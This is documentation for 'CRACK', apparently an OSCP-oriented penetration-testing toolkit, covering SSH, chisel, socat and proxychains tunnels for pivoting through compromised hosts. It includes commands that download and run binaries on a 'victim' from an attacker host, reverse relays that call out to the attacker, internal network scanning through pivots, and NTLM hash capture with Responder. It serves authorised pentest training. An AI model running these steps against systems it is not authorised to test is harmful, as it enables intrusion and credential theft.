# CRACK Tunnel Management Guide

**Complete guide to pivoting and port forwarding using CRACK's tunnel system.**

## Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
- [Tunnel Types](#tunnel-types)
  - [SSH Tunneling](#ssh-tunneling)
  - [Chisel Tunneling](#chisel-tunneling)
  - [Socat Relay](#socat-relay)
  - [Proxychains Configuration](#proxychains-configuration)
- [CLI Commands](#cli-commands)
- [Python API](#python-api)
- [OSCP Scenarios](#oscp-scenarios)
- [Troubleshooting](#troubleshooting)

---

## Overview

CRACK's tunnel management system provides comprehensive pivoting and port forwarding capabilities for OSCP exam scenarios. Supports:

- **SSH Tunneling** (-L, -R, -D): Standard SSH port forwarding and SOCKS proxy
- **Chisel**: HTTP-based tunneling when SSH blocked
- **Socat**: Simple relay for port forwarding without authentication
- **Proxychains**: Auto-generate configs for routing tools through pivots

### Key Features

- **Port Conflict Detection**: Automatically detects if ports are in use
- **Auto-Cleanup**: Kills tunnels when parent session dies
- **Process Tracking**: Monitors tunnel health via PID validation
- **Multiple Tunnel Types**: SSH, chisel, socat, proxychains all supported
- **Session Integration**: Tunnels tied to sessions for organized management

---

## Quick Start

### 1. Install Dependencies

```bash
# SSH (usually pre-installed)
which ssh

# Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
sudo mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel
sudo chmod +x /usr/local/bin/chisel

# Socat
sudo apt-get install socat

# Proxychains
sudo apt-get install proxychains4
```

### 2. Basic Tunnel Creation

```python
from crack.sessions.tunnel import TunnelManager, SSHTunnel
from crack.sessions.storage.base import SessionStorage
from crack.sessions.config import SessionConfig
from crack.sessions.models import Session

# Initialize
storage = SessionStorage()
config = SessionConfig()
manager = TunnelManager(storage, config)

# Create SSH local forward (access internal MySQL)
tunnel = manager.create_tunnel(
    session_id='session-123',
    tunnel_type='ssh-local',
    target='192.168.45.150',
    local_port=3306,
    remote_host='192.168.1.10',
    remote_port=3306
)

print(f"Tunnel active: {tunnel.get_connection_string()}")
# Output: localhost:3306 -> 192.168.1.10:3306
```

### 3. CLI Usage

```bash
# Create SSH tunnel via CLI
crack session tunnel-create abc123 \
  --type ssh-local \
  --local-port 3306 \
  --remote-host 192.168.1.10 \
  --remote-port 3306 \
  --username user

# List active tunnels
crack session tunnel-list

# Kill tunnel
crack session tunnel-kill <tunnel-id>
```

---

## Tunnel Types

### SSH Tunneling

SSH tunneling is the most common and reliable method for pivoting.

#### SSH Local Forward (-L)

**Purpose**: Access services on internal network through compromised host

```python
from crack.sessions.tunnel.ssh import SSHTunnel
from crack.sessions.models import Session

# Create session
session = Session(target='192.168.45.150', port=22)

# Initialize SSH tunnel
ssh = SSHTunnel(
    session=session,
    username='user',
    password='pass123'  # Or use key_file=Path('/root/.ssh/id_rsa')
)

# Create local forward tunnel
tunnel = ssh.local_forward(
    local_port=3306,
    remote_host='192.168.1.10',  # Internal host from victim's perspective
    remote_port=3306
)

# Now connect from Kali:
# mysql -h 127.0.0.1 -P 3306 -u root -p
```

**Command Explanation**:
```bash
ssh -N -L 3306:192.168.1.10:3306 user@192.168.45.150

# -N: No remote command execution (tunnel only)
# -L <local_port>:<remote_host>:<remote_port>: Local port forward
# -f: Background mode (not used, we track PID manually)
```

**Use Cases**:
- Access internal databases (MySQL, PostgreSQL, MSSQL)
- Internal web admin panels (phpMyAdmin, Tomcat Manager)
- SMB shares on internal network
- RDP to internal Windows hosts

**Manual Alternative** (if SSH fails):
```bash
# On victim (using socat):
victim$ socat TCP-LISTEN:3306,fork TCP:192.168.1.10:3306

# On Kali:
mysql -h 192.168.45.150 -P 3306
```

#### SSH Remote Forward (-R)

**Purpose**: Expose attacker's services to victim

```python
# Expose attacker's SMB server to victim
tunnel = ssh.remote_forward(
    remote_port=445,
    local_host='127.0.0.1',
    local_port=445
)

# Victim can now connect to localhost:445 (hits attacker's SMB)
# victim$ smbclient //localhost/share -U user
```

**Command Explanation**:
```bash
ssh -N -R 445:127.0.0.1:445 user@192.168.45.150

# -R <remote_port>:<local_host>:<local_port>: Remote port forward
```

**Use Cases**:
- Expose Responder/impacket-smbserver for hash capture
- Host payload HTTP server accessible from victim
- Reverse proxy for C2 callbacks
- Expose exploit services to victim

**Manual Alternative**:
```bash
# On victim (reverse relay):
victim$ socat TCP:attacker_ip:445 TCP-LISTEN:445,fork
```

#### SSH Dynamic SOCKS (-D)

**Purpose**: Route all tools through SOCKS proxy

```python
# Create SOCKS proxy
tunnel = ssh.dynamic_socks(local_port=1080)

# Configure proxychains:
# Edit /etc/proxychains.conf:
# [ProxyList]
# socks5 127.0.0.1 1080

# Use with tools:
# proxychains nmap -sT -Pn 192.168.1.0/24
# proxychains curl http://192.168.1.10
```

**Command Explanation**:
```bash
ssh -N -D 1080 user@192.168.45.150

# -D <local_port>: Dynamic SOCKS proxy
```

**Use Cases**:
- Full network scanning through pivot
- Access entire internal network
- Route Metasploit through pivot
- Browse internal web applications

---

### Chisel Tunneling

**When to use**: SSH not available, HTTP egress allowed

Chisel is a Go-based HTTP tunnel tool. Single binary, easy to transfer.

#### Server Setup (Attacker)

```python
from crack.sessions.tunnel.chisel import ChiselTunnel
from crack.sessions.models import Session

session = Session(target='192.168.45.150')
chisel = ChiselTunnel(session)

# Start server (reverse mode)
tunnel = chisel.start_server(
    port=8000,
    reverse=True  # Allow reverse tunnels from client
)

# Server now listening on port 8000
```

#### Client Command Generation

```python
# Generate client command for victim
client_cmd = chisel.connect_client(
    server_url='http://192.168.45.150:8000',
    tunnel_spec='R:8080:localhost:80'
)

print(f"Run on victim: {client_cmd}")
# Output: chisel client http://192.168.45.150:8000 R:8080:localhost:80
```

**Tunnel Specifications**:
```
R:8080:localhost:80              # Victim's localhost:80 -> Attacker's 0.0.0.0:8080
R:3306:192.168.1.10:3306         # Victim's internal DB -> Attacker's 0.0.0.0:3306
R:socks                          # SOCKS proxy on attacker through victim
8080:localhost:80                # Forward mode (less common)
```

#### Transfer Methods

```bash
# HTTP Download
attacker$ python3 -m http.server 80
victim$ wget http://attacker/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Base64 Transfer
attacker$ cat chisel | base64 -w0 | xclip -selection clipboard
victim$ echo "<PASTE>" | base64 -d > /tmp/chisel && chmod +x /tmp/chisel

# Windows SMB
attacker$ impacket-smbserver share . -smb2support
victim> copy \\attacker\share\chisel.exe C:\chisel.exe
```

---

### Socat Relay

**When to use**: Simple port forwarding without authentication

```python
from crack.sessions.tunnel.socat import SocatTunnel
from crack.sessions.models import Session

session = Session(target='192.168.45.150')
socat = SocatTunnel(session)

# Create relay (attacker machine)
tunnel = socat.create_relay(
    local_port=8080,
    remote_host='192.168.1.10',
    remote_port=80
)

# Now: curl http://localhost:8080 -> 192.168.1.10:80
```

**Command Explanation**:
```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.10:80

# TCP-LISTEN: Listen for TCP connections
# reuseaddr: Allow address reuse (avoid "Address already in use")
# fork: Fork new process for each connection
```

#### Reverse Relay (Run on Victim)

```python
# Generate reverse relay command
cmd = socat.create_reverse_relay(
    victim_port=3306,
    attacker_host='192.168.45.150',
    attacker_port=4444
)

print(f"Run on victim: {cmd}")
# Output: socat TCP:192.168.45.150:4444 TCP:localhost:3306
```

**Use Cases**:
- Simple port forwarding without SSH credentials
- Protocol conversion (TCP -> UDP)
- Encrypted relays (SSL/TLS with --openssl)
- File transfer relay

---

### Proxychains Configuration

**Auto-generate proxychains configs from tunnels**

```python
from crack.sessions.tunnel.proxychains import ProxychainsManager

manager = ProxychainsManager()

# Create config for SSH SOCKS proxy
config_path = manager.create_config(
    proxy_host='127.0.0.1',
    proxy_port=1080,
    proxy_type='socks5',
    config_path='/tmp/proxychains.conf'
)

# Generate command wrapper
cmd = manager.run_through_proxy(
    command='nmap -sT -Pn 192.168.1.0/24',
    config_path=config_path
)

print(cmd)
# Output: proxychains -f /tmp/proxychains.conf nmap -sT -Pn 192.168.1.0/24
```

#### Multi-Hop Pivoting

```python
# Chain through multiple proxies
config_path = manager.create_config(
    proxy_host='127.0.0.1',
    proxy_port=1080,
    additional_proxies=[
        {'type': 'socks5', 'host': '192.168.1.10', 'port': 1081}
    ]
)

# Traffic flows: Kali -> 127.0.0.1:1080 -> 192.168.1.10:1081 -> target
```

#### Tool Examples

```bash
# Network Scanning
proxychains nmap -sT -Pn -p- 192.168.1.10

# Web Enumeration
proxychains gobuster dir -u http://192.168.1.10 -w wordlist.txt
proxychains nikto -h http://192.168.1.10

# Exploitation
proxychains msfconsole
proxychains sqlmap -u http://192.168.1.10/?id=1

# Database Access
proxychains mysql -h 192.168.1.10 -u root -p
proxychains psql -h 192.168.1.10 -U postgres

# SMB Enumeration
proxychains smbclient -L //192.168.1.10
proxychains enum4linux 192.168.1.10
```

**Important Notes**:
- Use `-sT` for nmap (TCP connect scan, not SYN)
- Use `-Pn` for nmap (skip ping, may not work through proxy)
- ICMP tools (ping, traceroute) won't work
- UDP scanning won't work (SOCKS is TCP-only)

---

## CLI Commands

### tunnel-create

Create tunnel for session.

```bash
# SSH local forward
crack session tunnel-create <session-id> \
  --type ssh-local \
  --local-port 3306 \
  --remote-host 192.168.1.10 \
  --remote-port 3306 \
  --username user \
  --password pass

# SSH SOCKS proxy
crack session tunnel-create <session-id> \
  --type ssh-dynamic \
  --socks-port 1080 \
  --username user \
  --key-file /root/.ssh/id_rsa

# Socat relay
crack session tunnel-create <session-id> \
  --type socat \
  --local-port 8080 \
  --remote-host 192.168.1.10 \
  --remote-port 80
```

### tunnel-list

List active tunnels.

```bash
# List all tunnels
crack session tunnel-list

# Filter by session
crack session tunnel-list --session <session-id>

# Filter by status
crack session tunnel-list --status active
```

### tunnel-kill

Terminate tunnel.

```bash
crack session tunnel-kill <tunnel-id>
```

---

## Python API

### TunnelManager

**Central orchestrator for all tunnel types**

```python
from crack.sessions.tunnel import TunnelManager
from crack.sessions.storage.base import SessionStorage
from crack.sessions.config import SessionConfig

# Initialize
storage = SessionStorage()
config = SessionConfig()
manager = TunnelManager(storage, config)

# Create tunnel
tunnel = manager.create_tunnel(
    session_id='session-123',
    tunnel_type='ssh-local',
    target='192.168.45.150',
    local_port=3306,
    remote_host='192.168.1.10',
    remote_port=3306
)

# List tunnels
tunnels = manager.list_tunnels(session_id='session-123')
for t in tunnels:
    print(f"{t.type}: {t.get_connection_string()}")

# Get tunnel by ID
tunnel = manager.get_tunnel(tunnel_id)

# Kill tunnel
manager.kill_tunnel(tunnel_id)

# Cleanup dead tunnels
cleaned = manager.cleanup_dead_tunnels()
print(f"Cleaned {cleaned} dead tunnels")

# Get stats
stats = manager.get_stats(session_id='session-123')
print(f"Active: {stats['active']}, Dead: {stats['dead']}")
```

### SSHTunnel

**Direct SSH tunnel creation**

```python
from crack.sessions.tunnel.ssh import SSHTunnel
from crack.sessions.models import Session

session = Session(target='192.168.45.150', port=22)

# Password auth
ssh = SSHTunnel(session, username='user', password='pass')

# Key-based auth
ssh = SSHTunnel(session, username='user', key_file=Path('/root/.ssh/id_rsa'))

# Local forward
tunnel = ssh.local_forward(3306, '192.168.1.10', 3306)

# Remote forward
tunnel = ssh.remote_forward(445, '127.0.0.1', 445)

# SOCKS proxy
tunnel = ssh.dynamic_socks(1080)

# Close tunnel
ssh.close()
```

### ChiselTunnel

**Chisel tunnel management**

```python
from crack.sessions.tunnel.chisel import ChiselTunnel

chisel = ChiselTunnel(session)

# Start server
tunnel = chisel.start_server(port=8000, reverse=True)

# Generate client command
client_cmd = chisel.connect_client(
    server_url='http://192.168.45.150:8000',
    tunnel_spec='R:8080:localhost:80'
)

# Get transfer instructions
print(chisel.get_transfer_instructions('linux'))

# Stop server
chisel.stop_server()
```

### SocatTunnel

**Socat relay management**

```python
from crack.sessions.tunnel.socat import SocatTunnel

socat = SocatTunnel(session)

# Create relay
tunnel = socat.create_relay(8080, '192.168.1.10', 80)

# Generate reverse relay command for victim
cmd = socat.create_reverse_relay(3306, '192.168.45.150', 4444)

# Encrypted relay
tunnel = socat.create_encrypted_relay(
    8443, '192.168.1.10', 80,
    cert_file='/path/to/server.pem'
)

# Stop relay
socat.stop()
```

### ProxychainsManager

**Proxychains config generation**

```python
from crack.sessions.tunnel.proxychains import ProxychainsManager

manager = ProxychainsManager()

# Create config
config_path = manager.create_config(
    proxy_host='127.0.0.1',
    proxy_port=1080,
    proxy_type='socks5'
)

# Run command through proxy
cmd = manager.run_through_proxy('nmap -sT 192.168.1.0/24')

# Create config from tunnel
config_path = manager.create_tunnel_config(ssh_tunnel)

# Get usage examples
print(manager.get_usage_examples())
```

---

## OSCP Scenarios

### Scenario 1: Access Internal Database

**Situation**: Compromised web server (192.168.45.150) can access internal MySQL (192.168.1.10:3306)

**Solution**: SSH local forward

```python
# Create SSH tunnel
ssh = SSHTunnel(session, username='www-data', key_file=Path('/tmp/id_rsa'))
tunnel = ssh.local_forward(3306, '192.168.1.10', 3306)

# Connect from Kali
# mysql -h 127.0.0.1 -P 3306 -u root -p
```

### Scenario 2: Scan Internal Network

**Situation**: Need to scan internal network (192.168.1.0/24) through compromised host

**Solution**: SSH SOCKS proxy + proxychains

```python
# Create SOCKS proxy
tunnel = ssh.dynamic_socks(1080)

# Generate proxychains config
manager = ProxychainsManager()
config_path = manager.create_config('127.0.0.1', 1080)

# Scan internal network
# proxychains nmap -sT -Pn 192.168.1.0/24
```

### Scenario 3: Multi-Hop Pivot

**Situation**: Kali -> Host1 (192.168.45.150) -> Host2 (192.168.1.10) -> Internal Network (10.10.10.0/24)

**Solution**: Chain SSH tunnels

```python
# Tunnel 1: Kali -> Host1
ssh1 = SSHTunnel(session1, username='user1', password='pass1')
tunnel1 = ssh1.dynamic_socks(1080)

# Tunnel 2: Host1 -> Host2 (run on Host1)
# host1$ ssh -D 1081 user2@192.168.1.10

# Create multi-hop proxychains config
manager = ProxychainsManager()
config_path = manager.create_config(
    proxy_host='127.0.0.1',
    proxy_port=1080,
    additional_proxies=[
        {'type': 'socks5', 'host': '127.0.0.1', 'port': 1081}
    ]
)

# Scan 10.10.10.0/24
# proxychains nmap -sT -Pn 10.10.10.0/24
```

### Scenario 4: Chisel When SSH Blocked

**Situation**: SSH port 22 blocked, but HTTP (80/443) allowed

**Solution**: Chisel HTTP tunnel

```python
# Start chisel server on Kali
chisel = ChiselTunnel(session)
tunnel = chisel.start_server(port=8000, reverse=True)

# Transfer chisel to victim
# victim$ wget http://192.168.45.150/chisel && chmod +x chisel

# Run on victim
# victim$ ./chisel client http://192.168.45.150:8000 R:8080:localhost:80

# Access from Kali
# curl http://localhost:8080
```

### Scenario 5: Expose Responder to Victim

**Situation**: Need to capture NTLM hashes from victim

**Solution**: SSH remote forward + Responder

```python
# Start Responder on Kali
# sudo responder -I tun0

# Create reverse tunnel
tunnel = ssh.remote_forward(445, '127.0.0.1', 445)

# Trigger on victim
# victim$ smbclient //localhost/share
# Victim's hash captured by Responder
```

---

## Troubleshooting

### Port Already in Use

**Error**: `Port 3306 is already in use`

**Solution**:
```python
# Find next available port
port = manager.get_next_available_port(start=3306)
tunnel = manager.create_tunnel(..., local_port=port)
```

### SSH Tunnel Dies Immediately

**Symptoms**: Tunnel marked as 'error', process terminates

**Causes**:
1. Wrong credentials
2. SSH not allowed for user
3. Host key verification failed
4. Port already in use on remote

**Debug**:
```python
# Check stderr
if tunnel.status == 'error':
    print(tunnel.error_message)

# Test SSH manually
# ssh -v user@192.168.45.150
```

### Proxychains Hangs

**Symptoms**: Tools hang when using proxychains

**Causes**:
1. SOCKS proxy not running
2. Wrong port in config
3. Tool doesn't support proxychains (uses UDP/ICMP)

**Solutions**:
```bash
# Test proxy manually
curl --socks5 127.0.0.1:1080 http://192.168.1.10

# Use -q for quiet mode (less output)
proxychains -q nmap -sT 192.168.1.10

# Check proxychains config
cat /tmp/proxychains.conf
```

### Chisel Connection Failed

**Symptoms**: Client can't connect to server

**Causes**:
1. Firewall blocking port
2. Wrong server URL
3. Server not in reverse mode

**Debug**:
```bash
# Test from victim
victim$ curl http://192.168.45.150:8000

# Check server logs
# Look for connection attempts

# Try with authentication
chisel server --port 8000 --reverse --auth user:pass
chisel client --auth user:pass http://server:8000 R:8080:localhost:80
```

### Socat Relay Not Working

**Symptoms**: Can't connect to local port

**Causes**:
1. Socat binary not found
2. Port already in use
3. Firewall rules

**Debug**:
```bash
# Check if socat running
ps aux | grep socat

# Test bind manually
nc -nlvp 8080

# Check port status
ss -tlnp | grep 8080
```

---

## Best Practices

### 1. Port Organization

Use consistent port ranges:
- **3000-3999**: Database forwards (MySQL, PostgreSQL, MSSQL)
- **4000-4999**: Web application forwards
- **8000-8999**: HTTP/HTTPS tunnels
- **1080-1089**: SOCKS proxies

### 2. Naming Convention

Use descriptive tunnel metadata:
```python
tunnel = manager.create_tunnel(
    ...,
    metadata={
        'description': 'Access internal MySQL on 192.168.1.10',
        'purpose': 'database enumeration',
        'target_service': 'mysql'
    }
)
```

### 3. Cleanup

Always cleanup tunnels after use:
```python
# Kill specific tunnel
manager.kill_tunnel(tunnel_id)

# Cleanup all tunnels for session
manager.cleanup_session_tunnels(session_id)

# Cleanup dead tunnels
manager.cleanup_dead_tunnels()
```

### 4. Security

- Use key-based auth over passwords
- Use encrypted tunnels (chisel with TLS, socat with SSL)
- Don't expose tunnels to 0.0.0.0 unless necessary
- Kill tunnels immediately after use

### 5. Documentation

Document your pivoting chain:
```python
# Create visual map
print("""
Pivoting Chain:
Kali (192.168.45.150)
  -> SSH SOCKS (1080)
  -> Host1 (192.168.45.151)
  -> SSH Local Forward (3306:192.168.1.10:3306)
  -> Internal DB (192.168.1.10:3306)
""")
```

---

## Reference

### Quick Command Reference

```bash
# SSH
ssh -N -L 3306:192.168.1.10:3306 user@pivot        # Local forward
ssh -N -R 445:127.0.0.1:445 user@pivot             # Remote forward
ssh -N -D 1080 user@pivot                          # SOCKS proxy

# Chisel
chisel server --reverse --port 8000                 # Server
chisel client http://server:8000 R:8080:localhost:80  # Client

# Socat
socat TCP-LISTEN:8080,reuseaddr,fork TCP:target:80  # Relay
socat TCP:server:4444 TCP:localhost:3306             # Reverse relay

# Proxychains
proxychains nmap -sT -Pn target                     # Use proxy
proxychains curl http://target                      # HTTP requests
```

### Port Ranges

- **20-21**: FTP
- **22**: SSH
- **23**: Telnet
- **25**: SMTP
- **53**: DNS
- **80, 443**: HTTP/HTTPS
- **110**: POP3
- **135-139, 445**: SMB
- **389, 636**: LDAP
- **1433**: MSSQL
- **3306**: MySQL
- **3389**: RDP
- **5432**: PostgreSQL
- **5985, 5986**: WinRM

---

## Additional Resources

- **SSH Man Page**: `man ssh`
- **Chisel GitHub**: https://github.com/jpillora/chisel
- **Socat Man Page**: `man socat`
- **Proxychains Man Page**: `man proxychains`
- **OSCP Pivoting Guide**: https://www.offensive-security.com/offsec/pivoting/

---

**Questions? Issues?**
- Check logs: `~/.crack/logs/tunnels.log`
- Run with debug: `crack session tunnel-create --debug`
- Test manually: Use raw SSH/chisel/socat commands first
